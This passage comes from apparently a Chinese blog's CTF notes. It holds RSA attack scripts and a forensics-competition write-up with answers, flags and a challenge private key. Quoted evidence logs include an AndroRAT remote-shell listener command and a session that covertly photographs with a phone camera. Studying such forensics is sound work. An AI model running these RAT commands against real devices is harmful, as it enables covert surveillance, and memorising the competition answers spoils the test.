**销毁中间变量**：删除 $p$ 和 $q$，保留 $(N, e)$ 为公钥，$(N, d)$ 为私钥。\n- 加解密过程\n  - **加密**：将明文 $m$ 转为数字，计算密文 $c \\equiv m^e \\pmod{N}$。\n  - **解密**：使用私钥计算明文 $m \\equiv c^d \\pmod{N}$。\n    - 常见过程：--->求d--->求欧拉函数--->求大素数-->如何得到素数\n##### 补充：欧拉函数及其性质\n- 多因子计算欧拉函数\n![img](/images/c-1.png)\n- 高阶的pq计算欧拉函数\n![img](/images/c-2.png)\n![img](/images/c-3.png)\n##### 补充：模的性质\n![img](/images/c-4.png)\n##### 题目类型\n###### 基础RSA\n- RSA常见脚本：\n```python\nfrom Crypto.Util.number import *\n\nn = p*q\nphi = (p-1)*(q-1)\nd = inverse(e,phi)\nm = pow(c,d,n)\nprint(long_to_bytes(m))\n```\n###### 分解N\n- 本地工具（yafu打开cmd使用，\n  - 分解因数n：.\\yafu-x64.exe \"factor(n)\"\n- [在线网站](https://factordb.com/)\n  - 注意！！！点数字后就到上方框里了可以复制！！！（有点愚蠢但愚蠢的人没发现\n###### pq相邻素数\n- 特征：\n```python\np = getPrime(512)\nq = gmpy2.next_prime(p)\n```\n- 解法：\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\n\n\n\nsn = isqrt(n)\nq = next_prime(sn)\np = n // q\n\nphi = (p-1)*(q-1)\nd = invert(e, phi)\n\nm = pow(c, d, n)\nprint(long_to_bytes(m))\n```\n###### pq相近\n- 特征：\n```python\nq = gmpy2.next_prime(p - getPrime(128)+getPrime(128)-getPrime(256)+getPrime(256))\n```\n- 解法：费马分解\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\n\ndef fermat_attack(n):\n    a = isqrt(n)\n    b2 = a*a - n\n    b = isqrt(n)\n    count = 0\n    while b*b != b2:\n        a = a + 1\n        b2 = a*a - n\n        b = isqrt(b2)\n        count += 1\n    p = a+b\n    q = a-b\n    assert n == p * q\n    return p, q\n\np, q = fermat_attack(n)\nphi = (p-1)*(q-1)\nd = invert(e, phi)\n\nm = pow(c, d, n)\nprint(long_to_bytes(m))\n```\n###### 共享素数\n- 例题：\n```python\nfrom Crypto.Util.number import *\nflag = b'***********'\n\np1 = getPrime(512)\nq = getPrime(512)\np2 = getPrime(512)\n\nn1 = p1*q\nn2 = p2*q\n\ne = 65537\n\nm = bytes_to_long(flag)\nc1 = pow(m, e, n1)\nc2 = pow(m, e, n2)\n\nprint(f'n1 = {n1}')\nprint(f'n2 = {n2}')\nprint(f'e = {e}')\nprint(f'c1 = {c1}')\nprint(f'c2 = {c2}')\n\n\"\"\"\nn1 = \nn2 = \ne = 65537\nc1 = \nc2 = \n```\n- 解法：求最小公因数\n```\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\n\nq = gcd(n1, n2)\np1 = n1 // q\nphi = (p1-1)*(q-1)\nd = invert(e, phi)\n\nm = pow(c1, d, n1)\nprint(long_to_bytes(m))\n```\n###### 多个素数\n- 特征：\n```python\np = getPrime(512)\nq = getPrime(512)\nr = getPrime(512)\nn = p*q*r\ne = 65537\nphi = (p-1)*(q-1)*(r-1)\n```\n- 解法：\n```\nfrom Crypto.Util.number import *\n\nn=p*q*r\nphi = (p-1)*(q-1)*(r-1)\nd = inverse(e, phi)\nm = pow(c, d, n)\n\nprint(long_to_bytes(m))\n```\n###### 素数中有高阶次方\n- 思路：素数中有高阶次方求欧拉\n\n![alt text](/img/速成crypto视频学习笔记_s-6.png)\n- 解法：\n```python\nfrom Crypto.Util.number import *\n\nn = (p**7)*q # 特征\n\nphi = (p**6)*(p-1)*(q-1)\nd = inverse(e, phi)\nm = pow(c, d, n)\n\nprint(long_to_bytes(m))\n```\n###### dpdq泄露\n- 特征：\n```python\nfrom Crypto.Util.number import *\n\nflag = b'flag{easy_RSA888888888888}'\n\np = getPrime(512)\nq = getPrime(512)\n\nn = p*q\ne = getPrime(128)\nd = inverse(e, (p-1)*(q-1))\n\ndp = d % (p-1)\ndq = d % (q-1)\n\nm = bytes_to_long(flag)\n\nc = pow(m, e, n)\n\nprint(f'p = {p}')\nprint(f'q = {q}')\nprint(f'c = {c}')\nprint(f'dp = {dp}') # 特征\nprint(f'dq = {dq}')\n\n```\n- 思路：存脚本\n\n![alt text](/img/速成crypto视频学习笔记_s-7.png)\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\n\np = \nq = \nc = \ndp = \ndq = \n\ninvp = invert(p, q)\nm1 = powmod(c, dp, p)\nm2 = powmod(c, dq, q)\nm = (((m2 - m1)*invp) % q)*p + m1\nprint(long_to_bytes(m))\n```\n###### 共模攻击\n- 特征\n```python\ne1 = getPrime(16)\ne2 = getPrime(16)\n\nc1 = pow(m, e1, n)\nc2 = pow(m, e2, n)\n```\n- 思路：存脚本\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\n\nn = \ne1 = 55313\ne2 = 44647\nc1 = \nc2 = \n_, s1, s2 = gcdext(e1, e2)\n\nm = powmod(c1, s1, n)*powmod(c2, s2, n) % n\nprint(long_to_bytes(m))\n```\n\n### 知识补充\n- getPrime() 函数\n  - 在Python中通常来自 Crypto.Util.number 模块，用于生成指定位数的随机**质数**\n- python中invert和inverse函数在ctf crypto题目应用区别\n  - gmpy2.invert (通常更快)\n  - 当逆元不存在时（gcd(a, n) != 1）\n```python\n# gmpy2.invert 返回 None\nresult1 = invert(4, 8)  # gcd(4,8)=4 != 1\nprint(f\"gmpy2.invert(4,8) = {result1}\")  # None\n\n# Crypto.Util.number.inverse 抛出异常\ntry:\n    result2 = inverse(4, 8)\nexcept ValueError as e:\n    print(f\"Crypto.inverse(4,8) 错误: {e}\")\n```\n","tags":["ctf","crypto"],"categories":["知识点笔记"]},{"title":"2025平航杯结合SPC出题","url":"/2025/10/16/2025平航杯结合SPC出题/","content":"## 致谢\n\n### 题目背景\n爱⽽不得，进而由爱生恨。作为有黑客背景的他，激发出了强烈的占有欲，虽然不能在真实物理世界成 为她的伴侣，但在虚拟世界⾥，他执着的要成为她的主宰，于是，我们的故事开始了……。手机，电 脑，服务器，⽊⻢，AI，Iot设备……无⼀幸免的都成为他的作案⼯具或⽬标，但最终在诸位明察秋毫的取证达人面前，都无处遁形，作恶者终将被绳之以法。追悔莫及的他最后终于明⽩，其实真正的爱，不是占有，而是放手！！！\n\n2025年4⽉，杭州滨江警⽅接到辖区内市⺠刘晓倩(简称：倩倩)报案称：其个⼈电⼦设备疑似遭 ⼈监控。经初步调查，警⽅发现倩倩的手机存在可疑后台活动，手机可能存在被木马控制情况； 对倩倩计算机进⾏流量监控，捕获可疑流量包。遂启动电子数据取证程序。\n\n警⽅通过对倩倩手机和恶意流量包的分析，锁定⼀名化名“起早王”的本地男子。经搜查其住所， 警⽅查扣⼀台个人电脑和服务器。技术分析显示，该服务器中存有与倩倩设备内同源的特制远控木马，可实时窃取手机摄像头、手机通信记录等相关敏感文件。进⼀步对服务器溯源，发现“起 早王”曾渗透其任职的科技公司购物网站，获得公司服务器权限，非法窃取商业数据并使用公司 的服务器搭建Trojan服务并作为跳板机实施远控。\n\n请你结合以上案例并根据相关检材，完成下面的勘验工作。\n密码：早起王的爱恋日记❤\n\n### 计算机取证\n\n#### 7. 分析起早王的计算机检材，SillyTavern中账户起早王的创建时间是什么时候(格式：2020/1/1 01:01:01)\n- 有毛病为啥SillyTavern搜索后找到文件夹，开启方式不在此文件下层，在上层的bat文件。。。\n- 初步推测是因为SillyTavern账密在日记里，所以我搜到的是日记的日志文件？？？\n- SillyTavern账户密码在日记里，进入得到磁盘解密密码\n\n#### 很多思路都是找日志\n\n#### 9. 分析起早王的计算机检材，SillyTavern中起早王与ai女友聊天所调用的语言模型(带文件后缀)(格式：xxxxx-xxxxxxx.xxxx)\n- sq思路\n  - 日志里边，一般先点data，然后再找\n  - 或者everything小倩\n- Tifa-DeepsexV2-7b-Cot-0222-Q8\n#### 12. 分析起早王的计算机检材，最早被换脸的图片所使用的换脸模型是什么(带文件后缀)(格式：xxxxxxxxxxx.xxxx)\n- 不知道为什么是model搜索后选这个？？？\n- 文件夹搜索，everything好像搜索不到加密磁盘\n```txt\n\"face_detector_model\": \"yoloface\",\n\"face_landmarker_model\": \"2dfan4\",\n\"face_occluder_model\": \"xseg_1\",\n\"face_parser_model\": \"bisenet_resnet_34\",\n\"age_modifier_model\": \"styleganex_age\",\n\"deep_swapper_model\": \"iperov/elon_musk_224\",\n\"expression_restorer_model\": \"live_portrait\",\n\"face_editor_model\": \"live_portrait\",\n\"face_enhancer_model\": \"gfpgan_1.4\",\n\"face_swapper_model\": \"inswapper_128_fp16\", # 选了这个\n\"frame_colorizer_model\": \"ddcolor\",\n\"frame_enhancer_model\": \"span_kendata_x4\",\n\"lip_syncer_model\": \"wav2lip_gan_96\"\n```\n- 直接搜.json能看到对应的配置文件，而且只有前三个是有时间的，查看最早的配置文件【来自xc学长未尝试】\n\n![alt text](/img/2025平航杯结合SPC出题_image-24.png)\n#### 13. 分析起早王的计算机检材，neo4j中数据存放的数据库的名称是什么(格式：abd.ef)\n- data/databases\n- 找到graph.db\n\n#### 14. 分析起早王的计算机检材，neo4j数据库中总共存放了多少个节点(格式：1)\n- neo4j.bat console\n- http://localhost:7474/\n- 我的学习笔记里面找思维导图，有账密\n![alt text](/img/平航杯_p-5.png)\n- 17088个\n\n#### 15. 分析起早王的计算机检材，neo4j数据库内白杰的⼿机号码是什么(格式：12345678901)\n- 成功方案3个\n  - 去除limit25后导出csv文件直接ctrl+F搜索\n  - sq版本，一开始莫名其妙搜不到，后面手打成功了。。。\n```CQL\nMATCH (u:person {name: '⽩杰'})\nRETURN u.mobile;\n```\n  - xc版本\n```CQL\nMATCH (n {name:'白杰'})\nRETURN n;\n```\n#### 16. 分析起早王的计算机检材，分析neo4j数据库内数据，统计在2025年4月7日至13日期间使用非授权设备登录且登录地点超出其注册时登记的两个以上城市的⽤户数量(格式：1)【待学习】\n- 查了半天全是赛后复现。。放弃吧\n```CQL\nMATCH (u:User)-[:HAS_LOGIN]->(l:Login)-[:FROM_IP]->(ip:IP)\nMATCH (l)-[:USING_DEVICE]->(d:Device)\nWHERE\nl.time < datetime('2025-04-14')\nAND ip.city <> u.reg_city\nAND NOT (u)-[:TRUSTS]->(d)\nWITH\nu,\ncollect(DISTINCT ip.city) AS 异常登录城市列表,\ncollect(DISTINCT d.device_id) AS 未授权设备列表,\ncount(l) AS 异常登录次数\nWHERE size(异常登录城市列表) > 2\nRETURN\nu.user_id AS 用户ID,\nu.real_name AS 姓名,\n异常登录城市列表,\n未授权设备列表, 异常登录次数\nORDER BY 异常登录次数 DESC;\n```\n#### 18. 分析起早王的计算机检材，起早王的虚拟货币钱包是什么(格式：0x11111111)\n- 浏览器历史记录-最近关闭-metamask\n- 重置密码是卡死的，但不需要重置上面也有地址：0xd8786a1345cA969C792d9328f8594981066482e9\n\n#### 注意SHA256格式：字母大小写\n```python\ndef uppercase_to_lowercase(text):\n    return text.lower()\n\n# 示例\noriginal_string = input(\"输入：\")\nresult = uppercase_to_lowercase(original_string)\nprint(result)  \n```\n#### 19. 分析起早王的计算机检材，起早王请高手为倩倩发行了虚拟货币，请问倩倩币的最大供应量是多少(格式：100qianqian)\n![alt text](/img/2025平航杯结合SPC出题_image.png)\n![alt text](/img/2025平航杯结合SPC出题_image-1.png)\n### AI题目（注意：该题目要python 3.10环境，建议3.10.6）\n#### 22-25.分析crack文件，获得flag1(格式：flag1{123456})\n- 使用github开源软件解密，[下载位置](https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot/releases)，[使用方法](/2025/10/21/PyArmor-Unpacker使用教程)\n- flag1{you_are_so_smart} ; flag2{prompt_is_easy} ; flag3{no_question_can_kill_you} ; flag4{You_have_mastered_the_AI}\n\n### 手机部分\n#### 26. 该检材的备份提取时间（UTC）(格式：2020/1/1 01:01:01)\n- 2025-04-15 18:11:18.838 +0800  \n- 减8\n\n#### 27. 分析倩倩的手机检材,手机内Puzzle_Game拼图程序拼图APK中的Flag1是什么\n![alt text](/img/平航杯_p-1.png)\n![alt text](/img/平航杯_p-2.png)\n- 在Java中，Byte.MAX_VALUE 是 127，Byte.MIN_VALUE = -128\n- 密码：两种方法\n```python\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad\n\nMAGIC_NUMBERS = [113, 99, 92, 106, 89, 98, 54, 113, 104, 89, 117, 100, 113, 127, 124, 89]\nkey_bytes = bytearray(len(MAGIC_NUMBERS))\nfor i in range(len(MAGIC_NUMBERS)):\n    key_bytes[i] = MAGIC_NUMBERS[i] ^ 6\nprint(bytes(key_bytes))\n# >>> b'weZl_d0wn_sbwyz_'\n```\n![alt text](/img/平航杯_p-3.png)\n- 密文其实是在下面的 hexStringToByteArray 方法中（理解不了一点伪C代码。。可能这位置靠猜？\n\n![alt text](/img/平航杯_p-4.png)\n- 判断AES使用的是ECB模式\n  - 如果代码中没有指定模式，通常是ECB\n  - 如果是CBC模式，通常会有IV参数\n```伪c\nbyte[] decrypted = decryptAESBlock(cipherBytes, expandedKey, iv);\n```\n#### 29. 分析倩倩的手机检材,木马app是怎么被安装的（网址）(格式：http://127.0.0.1:1234/)\n![alt text](/img/2025平航杯结合SPC出题_image-5.png)\n![alt text](/img/2025平航杯结合SPC出题_image-6.png)\n![alt text](/img/2025平航杯结合SPC出题_image-7.png)\n- 还有种猜测，靠时间推\n#### 30. 分析倩倩的手机检材,检材内的木马app的hash是什么(格式：大写md5)\n![alt text](/img/2025平航杯结合SPC出题_image-4.png)\n#### 31. 分析倩倩的手机检材,检材内的木马app的应用名称是什么【格式：Baidu】\n- Google Service Framework\n- 纯猜啊。。\n\n#### 32. 分析倩倩的手机检材,检材内的木马app的使用什么加固(格式：腾讯乐固)\n![alt text](/img/2025平航杯结合SPC出题_image-8.png)\n##### 33. 分析倩倩的手机检材,检材内的木马软件所关联到的ip和端口是什么(格式：127.0.0.1:1111)\n![alt text](/img/2025平航杯结合SPC出题_image-10.png)\n- 但看后面日志文件能看到：\n```txt\n[root@localhost AndroRAT]# python3 androRAT.py --shell -i 0.0.0.0 -p 8000\n...\nGot connection from ('92.67.33.56', 60844)\n```\n- 但是：\n\n![alt text](/img/2025平航杯结合SPC出题_image-11.png)\n- 不理解\n- 自动分析牛啊\n\n![alt text](/img/2025平航杯结合SPC出题_image-25.png)\n- 但分析报告简直一坨。。\n- 没辙了放弃。。\n- honglian技术员帮忙用backdex搞，注意此软件用32的找，脱壳后查看\n\n![alt text](/img/2025平航杯结合SPC出题_image-57.png)\n- 成功了，泪流满面感激涕零٩(๑´3｀๑)۶\n#### 34. 该木马app控制手机摄像头拍了几张照片【格式：1】\n![alt text](/img/2025平航杯结合SPC出题_image-9.png)\n#### 35. 木马APP被使用的摄像头为(格式：Camera)\n```txt\nInterpreter:/> camList\n0 --  Back Camera\n1 --  Front Camera\n\nInterpreter:/> takepic 1\n[INFO] Taking Image\n[ERROR] Unable to connect to the Camera\n\nInterpreter:/> takepic 1\n[INFO] Taking Image\n[ERROR] Unable to connect to the Camera\n\nInterpreter:/> takepic 1\n[INFO] Taking Image\n[ERROR] Unable to connect to the Camera\n\nInterpreter:/> takepic 1\n[INFO] Taking Image\n[SUCCESS] Succesfully Saved in /root/AndroRAT/Dumps/Image_20250410-140555.jpg\n\nInterpreter:/> takepic 1\n[INFO] Taking Image\n[SUCCESS] Succesfully Saved in /root/AndroRAT/Dumps/Image_20250410-140605.jpg\n\nInterpreter:/> takepic 1\n[INFO] Taking Image\n[SUCCESS] Succesfully Saved in /root/AndroRAT/Dumps/Image_20250410-140622.jpg\n```\n- Front Camera\n#### 36. 分析倩倩的手机检材,木马APK通过调用什么api实现自身持久化(格式：JobStore)\n![alt text](/img/2025平航杯结合SPC出题_image-58.png)\n![alt text](/img/2025平航杯结合SPC出题_image-59.png)\n#### 37. 分析倩倩的手机检材,根据倩倩的身份证号请问倩倩来自哪里（格式：北京市西城区）\n![alt text](/img/2025平航杯结合SPC出题_image-12.png)\n![alt text](/img/2025平航杯结合SPC出题_image-13.png)\n- 找了下[离线工具](https://blog.csdn.net/qq_44196825/article/details/128757754),不知道为什么github打不开~~\n- 已下载，E:\\app-down\\ID归属地查询工具\\身份证归属地查询软件\n#### 38. 此手机检材的IMEI号是多少(格式：1234567890)【待】\n![alt text](/img/2025平航杯结合SPC出题_image-56.png)\n- 一个是imei一个是sp_imei答案是前一个，不知道为什么。。\n### exe逆向部分\n#### 39. 分析GIFT.exe，该程序的md5是什么(格式：大写md5)\n![alt text](/img/2025平航杯结合SPC出题_image-14.png)\n![alt text](/img/2025平航杯结合SPC出题_image-15.png)\n#### 40. GIFT.exe的使用的编程语言是什么(格式：C)\n![alt text](/img/2025平航杯结合SPC出题_image-16.png)\n- Python\n#### 41. 解开得到的LOVE2.exe的编译时间(格式：2025/1/1 01:01:01)\n- 运行用虚拟机！！！这是病毒！！！\n- 手机里面得到身份证，得到生日\n\n![alt text](/img/2025平航杯结合SPC出题_image-17.png)\n#### 42. 分析GIFT.exe，该病毒所关联到的ip和端口(格式：127.0.0.1:1111)【待】\n- 环境前俩没会话信息，最后一个？？？莫名其妙\n![alt text](/img/2025平航杯结合SPC出题_image-26.png)\n![alt text](/img/2025平航杯结合SPC出题_image-18.png)\n- 人家wp\n\n![alt text](/img/2025平航杯结合SPC出题_image-19.png)\n\n#### 43. 分析GIFT.exe，该病毒修改的壁纸md5(格式：大写md5)\n![alt text](/img/2025平航杯结合SPC出题_image-20.png)\n- `certutil -hashfile temp_wallpaper.png md5`\n- 支持MD2、MD4、MD5、SHA1、SHA256、SHA384和SHA512等。如果不指定HashAlgorithm，则默认使用MD5算法。\n- 733FC4483C0E7DB1C034BE5246DF5EC0\n\n#### 44. 分析GIFT.exe，为对哪些后缀的文件进行加密： A.doc B.xlsx C.jpg D.png E.ppt\n- 直接一个个新建试\n- 或者ida**在地址页面**搜doc\n\n![alt text](/img/2025平航杯结合SPC出题_image-27.png)\n#### 45. 分析GIFT.exe，病毒加密后的文件类型是什么(格式：DOCX文档)\n![alt text](/img/2025平航杯结合SPC出题_image-21.png)\n#### 46. 分析GIFT.exe，壁纸似乎被隐形水印加密过了？请找到其中的Flag3(格式：flag3{xxxxxxxx})\n![alt text](/img/2025平航杯结合SPC出题_image-22.png)\n- flag3{20241224_Our_First_Meet}\n#### 47. 分析GIFT.exe，病毒加密文件所使用的方法是什么(格式：Base64)\n![alt text](/img/2025平航杯结合SPC出题_image-23.png)\n- RSA\n#### 48. 分析GIFT.exe，请解密test.love得到flag4(格式：flag4{xxxxxxxx})\n- 随波逐流可以看\n\n![alt text](/img/2025平航杯结合SPC出题_image-28.png)\n- 直接文本编辑器也可以看\n```\n-----BEGIN RSA PRIVATE KEY-----\nMIIBVAIBADANBgkqhkiG9w0BAQEFAASCAT4wggE6AgEAAkEAjMqVpy4zP9cO5m/y\nw0wmvdLzpUc4FNnUgpKJ26YimfDtA1cTZanNlxbmM25OTPsg2SaRUZdq7M3oGUel\ngmRdFwIDAQABAkBYVtCZympLt0PZIQsAsWppltBbtxkgNCGcIBgx4sc5MT03erss\neyh2TqtQyO4aPYiOUUOWYw9hL4G6GFosXc+JAiEAvegkAhLXptnMlwCuwScK233w\ncbBcxKWWPgZckdHkGPsCIQC9ynkuhrI4j2nc2eItr1NoU3Y1sfv0I601iNK1YXMJ\nlQIgTYlomkgjMIagl865izdroW5sK578YXXSQATM6uStot0CIQCih1DNaiYXT6FN\nsv0BOIKJ9edmRjxIr4C2NqyTDZfRHQIgUUhesxSUmNdc5QzckCAozLdPAlcAy7q+\nk5ag7Oxp0r0=\n-----END RSA PRIVATE KEY-----\n```\n- 我真的人傻了找不到test.love\n- 没辙了存下脚本。。\n```python\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric import padding\nfrom cryptography.hazmat.backends import default_backend\n\n# 读取私钥\nwith open(\"private.pem\", \"rb\") as key_file:\n    private_key = serialization.load_pem_private_key(\n        key_file.read(),\n        password=None,  # 有密码就加上\n        backend=default_backend()\n    )\n\n# 打印密钥位数和块大小\nkey_size_bits = private_key.key_size\nkey_size_bytes = key_size_bits // 8\nprint(f\"私钥大小: {key_size_bits} 位 ({key_size_bytes} 字节)\")\n\n# 读取加密文件\nwith open(\"test.love\", \"rb\") as f:\n    encrypted_data = f.read()\n\n# 分块解密（每块长度等于密钥长度）\ndecrypted_data = b\"\"\nfor i in range(0, len(encrypted_data), key_size_bytes):\n    block = encrypted_data[i:i + key_size_bytes]\n    if len(block) != key_size_bytes:\n        raise ValueError(f\"第 {i//key_size_bytes + 1} 块大小不等于密钥长度，可能文件损坏\")\n\n    decrypted_block = private_key.decrypt(\n        block,\n        padding.PKCS1v15()\n    )\n    decrypted_data += decrypted_block\n\n# 打印结果\ntry:\n    print(\"解密内容：\")\n    print(decrypted_data.decode(\"utf-8\"))\nexcept UnicodeDecodeError:\n    print(\"解密完成，但内容不是有效的 UTF-8，可以保存为二进制文件\")\n\n    # 也可以写入文件\n    with open(\"decrypted_output.bin\", \"wb\") as f:\n        f.write(decrypted_data)\n    print(\"已保存为 decrypted_output.bin\")\n```\n### 服务器部分\n#### 4. 分析起早王的服务器检材，Trojan服务器混淆流量所使用的域名是什么【格式：xxx.xxx】\n![alt text](/img/2025平航杯结合SPC出题_image-29.png)\n#### 5. 分析起早王的服务器检材，Trojan服务运行的模式为：\nA、foward\nB、nat\nC、server\nD、client\n- 一般配置文件里的run_type就是运行模式，但是这边明显是被人修改过了\n\n![alt text](/img/2025平航杯结合SPC出题_image-30.png)\n- B\n#### 准备环节\n- 连宝塔\n- 连数据库，发现没有内容\n- **这边需要导入数据库备份，而备份在电脑虚拟机中**\n- 火眼搜\n\n![alt text](/img/2025平航杯结合SPC出题_image-31.png)\n- 导入navicat\n\n![alt text](/img/2025平航杯结合SPC出题_image-36.png)\n![alt text](/img/2025平航杯结合SPC出题_image-37.png)\n\n![alt text](/img/2025平航杯结合SPC出题_image-39.png)\n![alt text](/img/2025平航杯结合SPC出题_image-40.png)\n![alt text](/img/2025平航杯结合SPC出题_image-41.png)\n- 成功\n#### 7. 分析网站后台登录密码的加密逻辑, 密码 sbwyz1 加密后存在数据库中的值\n\n![alt text](/img/2025平航杯结合SPC出题_image-32.png)\n- 在这个地方我们可以看到加密函数为encrypt\n\n![alt text](/img/2025平航杯结合SPC出题_image-33.png)\n- 把AUTH_CODE的值和密码给拼接在了一起算md5（这里不是字符串。。为啥好奇怪记下来）\n- 找AUTH_CODE\n\n![alt text](/img/2025平航杯结合SPC出题_image-34.png)\n- TPSHOP\n\n![alt text](/img/2025平航杯结合SPC出题_image-35.png)\n- f8537858eb0eabada34e7021d19974ea\n#### 8. 网站后台显示的服务器GD版本是多少(格式：1.1.1 abc)\n![alt text](/img/2025平航杯结合SPC出题_image-42.png)\n#### 9. 网站后台中2016-04-01 00:00:00到2025-04-01 00:00:00订单列表有多少条记录(格式：1)\n![alt text](/img/2025平航杯结合SPC出题_image-43.png)\n- 1292\n#### 10. 在网站购物满多少免运费(格式：1)\n![alt text](/img/2025平航杯结合SPC出题_image-44.png)\n#### 11. 分析网站日志，成功在网站后台上传木马的攻击者IP是多少(格式：1.1.1.1)\n![alt text](/img/2025平航杯结合SPC出题_image-45.png)\n#### 13. 攻击者使用工具对内网进行扫描后，rdp扫描结果中的账号密码是什么(格式：abc:def)\n![alt text](/img/2025平航杯结合SPC出题_image-46.png)\n\n- **宝塔面板管理进入phpMyAdmin账密是对应数据库账密**\n#### 14. 对于每个用户，计算其注册时间（用户表中的注册时间戳）到首次下单时间（订单表中最早时间戳）的间隔，找出间隔最短的用户id。（格式：1）\n```SQL\nSELECT u.user_id, MIN(o.create_time) - u.reg_time  as time_diff \nFROM tp_users u \nJOIN tp_delivery_doc o ON u.user_id = o.user_id \nGROUP BY u.user_id, u.email, u.reg_time \nORDER BY time_diff ASC \nLIMIT 1;\n```\n- 180\n\n#### 15. 统计每月订单数量，找出订单最多的月份（XXXX年XX月）\n```SQL\nSELECT \n    EXTRACT(YEAR FROM FROM_UNIXTIME(o.create_time)) as year,\n    EXTRACT(MONTH FROM FROM_UNIXTIME(o.create_time)) as month,\n    COUNT(*) as order_count \nFROM tp_delivery_doc o\nGROUP BY year, month\nORDER BY order_count DESC\nLIMIT 1;\n```\n#### 16. 找出连续三天内下单的用户并统计总共有多少个（格式：1）\n```SQL\nSELECT \n    t1.user_id,\n    MIN(FROM_UNIXTIME(t1.add_time)) AS earliest_order_date\nFROM \n    tp_order t1\nWHERE EXISTS (\n    SELECT 1\n    FROM tp_order t2\n    WHERE t2.user_id = t1.user_id\n    AND FROM_UNIXTIME(t1.add_time) > FROM_UNIXTIME(t2.add_time)\n    AND DATEDIFF(FROM_UNIXTIME(t1.add_time), FROM_UNIXTIME(t2.add_time)) <= 3\n)\nGROUP BY \n    t1.user_id\nORDER BY \nt1.user_id;\n```\n### 流量分析取证\n#### 1. 请问侦查人员是用哪个接口进行抓到蓝牙数据包的（格式：DVI1-2.1）\n- “USB很明显是usb的流量哇，所以问侦查人员我们就在BLE（也就是蓝牙嘛，Bluetooth）看看”——sq\n\n![alt text](/img/2025平航杯结合SPC出题_image-47.png)\n#### 2. 起早王有一个用于伪装成倩倩耳机的蓝牙设备，该设备的原始设备名称为什么（格式：XXX_xxx 具体大小写按照原始内容）\n- tshark导出为json文件，方便搜索分析\n```cmd\ntshark -r E:\\平航杯工作位置\\BLE.pcapng -T json > BLE.json  \n# 把tshark.exe路径加入环境变量PATH\n```\n![alt text](/img/2025平航杯结合SPC出题_image-48.png)\n```python\nimport re\ndef extract_device_names(file_path):\n    # 设备名称的集合（自动去重）\n    device_names = set()\n    # 正则表达式模式，用于匹配设备名称\n    pattern = re.compile(r'\"btcommon\\.eir_ad\\.entry\\.device_name\":\\s*\"([^\"]+)\"')\n    with open(file_path, 'r', encoding='utf-8') as file:\n        for line in file:\n            # 在每一行中查找所有匹配项\n            matches = pattern.findall(line)\n            for match in matches:\n                # 将找到的设备名称添加到集合中（自动处理重复）\n                device_names.add(match)\n            # 输出结果\n    print(\"提取的设备名称列表：\")\n    for name in sorted(device_names):  # 按字母顺序排序输出\n        print(name)\n# 文件路径\nfile_path = \"BLE.json\"\nextract_device_names(file_path)\n```\n- 不少乱码，里边正常的就\n  - Cracked\n  - Flipper 123all\n  - QQ_WF_SP8OON\n- 搜到Flipper 123all可以拿来伪装蓝牙设备\n\n#### 3. 起早王有一个用于伪装成倩倩耳机的蓝牙设备，该设备修改成耳机前后的大写MAC地址分别为多少（格式：32位小写md5(原MAC地址_修改后的MAC地址) ，例如md5(11:22:33:44:55:66_77:88:99:AA:BB:CC)=a29ca3983de0bdd739c97d1ce072a392 ）\n- 根据题干，QQ是倩倩的，Flipper是起早王的\n\n![alt text](/img/2025平航杯结合SPC出题_image-51.png)\n![alt text](/img/2025平航杯结合SPC出题_image-52.png)\n- 915c25495da483dfbf42c44bf5210c40\n#### 4. 流量包中首次捕获到该伪装设备修改自身名称的UTC+0时间为？（格式：2024/03/07 01:02:03.123）\n![alt text](/img/2025平航杯结合SPC出题_image-53.png)\n- 注意是UTC+0所以-8小时2025/04/09 02:31:26.710\n\n#### 5. 起早王中途还不断尝试使用自己的手机向倩倩电脑进行广播发包，请你找出起早王手机蓝牙的制造商数据（格式：0x0102030405060708）\n![alt text](/img/2025平航杯结合SPC出题_image-54.png)\n\n#### 6. 起早王的真名是什么（格式：Cai_Xu_Kun 每个首字母均需大写 ）\n- neta直接跑\n\n![alt text](/img/2025平航杯结合SPC出题_image-55.png)\n- 或者手动：\n- 看另一个附件了，一样导出\n```cmd\ntshark -r E:\\平航杯工作位置\\USBPcap.pcapng -T json > USBPcap.json\n```\n- 然后脚本\n```python\nimport json\n# 定义正常按键映射表\nnormalKeys = {\"04\": \"a\", \"05\": \"b\", \"06\": \"c\", \"07\": \"d\", \"08\": \"e\", \"09\": \"f\", \"0a\": \"g\", \"0b\": \"h\", \"0c\": \"i\",\"0d\": \"j\", \"0e\": \"k\", \"0f\": \"l\", \"10\": \"m\", \"11\": \"n\", \"12\": \"o\", \"13\": \"p\", \"14\": \"q\", \"15\": \"r\",\"16\": \"s\", \"17\": \"t\", \"18\": \"u\", \"19\": \"v\", \"1a\": \"w\", \"1b\": \"x\", \"1c\": \"y\", \"1d\": \"z\", \"1e\": \"1\",\"1f\": \"2\", \"20\": \"3\", \"21\": \"4\", \"22\": \"5\", \"23\": \"6\", \"24\": \"7\", \"25\": \"8\", \"26\": \"9\", \"27\": \"0\",\"28\": \"<RET>\", \"29\": \"<ESC>\", \"2a\": \"<DEL>\", \"2b\": \"\\t\", \"2c\": \"<SPACE>\", \"2d\": \"-\", \"2e\": \"=\", \"2f\": \"[\",\"30\": \"]\", \"31\": \"\\\\\", \"32\": \"<NON>\", \"33\": \";\", \"34\": \"'\", \"35\": \"`\", \"36\": \",\", \"37\": \".\", \"38\": \"/\",\"39\": \"<CAP>\", \"3a\": \"<F1>\", \"3b\": \"<F2>\", \"3c\": \"<F3>\", \"3d\": \"<F4>\", \"3e\": \"<F5>\", \"3f\": \"<F6>\",\"40\": \"<F7>\", \"41\": \"<F8>\", \"42\": \"<F9>\", \"43\": \"<F10>\", \"44\": \"<F11>\", \"45\": \"<F12>\"}\n# 定义Shift键按下时的按键映射表\nshiftKeys = {\"04\": \"A\", \"05\": \"B\", \"06\": \"C\", \"07\": \"D\", \"08\": \"E\", \"09\": \"F\", \"0a\": \"G\", \"0b\": \"H\", \"0c\": \"I\",\"0d\": \"J\", \"0e\": \"K\", \"0f\": \"L\", \"10\": \"M\", \"11\": \"N\", \"12\": \"O\", \"13\": \"P\", \"14\": \"Q\", 